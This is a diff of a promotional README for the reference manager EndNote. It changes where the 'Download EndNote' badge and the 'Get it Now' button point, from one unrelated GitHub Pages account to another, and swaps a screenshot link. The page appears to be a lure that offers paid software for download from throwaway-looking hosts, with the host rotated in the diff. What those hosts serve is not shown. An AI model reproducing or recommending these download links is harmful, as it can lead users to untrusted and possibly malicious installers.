@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gazan-programs.github.io/.github/endNote">
+  <a href="https://polycia-apps.github.io/.github/endNote">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download EndNote"/>
   </a>
 </p>
@@ -27,7 +27,7 @@ The <a href="#endNote">literature review use case</a> collects all relevant pape
 The <a href="#endNote">graduate student use case</a> manages the growing reference library of literature across coursework, qualifying examinations, and dissertation research — years of reference collection organized and searchable, with citations always available for paper writing. <a href="#endNote">Clinical research use case</a> in medical and health sciences collects clinical trial literature, systematic review sources, and evidence-based medicine references in an organized library supporting clinical research and evidence synthesis.</p>
 
 <p align="center">
-  <img src="https://static.macupdate.com/screenshots/329559/m/endnote-screenshot.png?v=1658341361" alt="EndNote screenshot"/>
+  <img src="https://support.clarivate.com/Endnote/servlet/rtaImage?eid=ka14N000000MuWW&feoid=00N4100000e9NrK&refid=0EM4N000004rSEc" alt="EndNote screenshot"/>
 </p>
 
 <a href="#endNote">Citation style customization</a> modifies existing citation styles or creates new ones for journals with unique citation requirements — the style editor handles the specific formatting rules that any publication requires. <a href="#endNote">Duplicate detection and removal</a> identifies duplicate references in the library — when importing from multiple databases that index the same papers, duplicates appear and are removable to keep the library clean.
@@ -81,7 +81,7 @@ The 7000-plus citation style library reflects the genuine diversity of citation 
 
 <p align="center">
 
-[![Get it Now EndNote](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/endNote)
+[![Get it Now EndNote](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/endNote)
 
 </p>
 
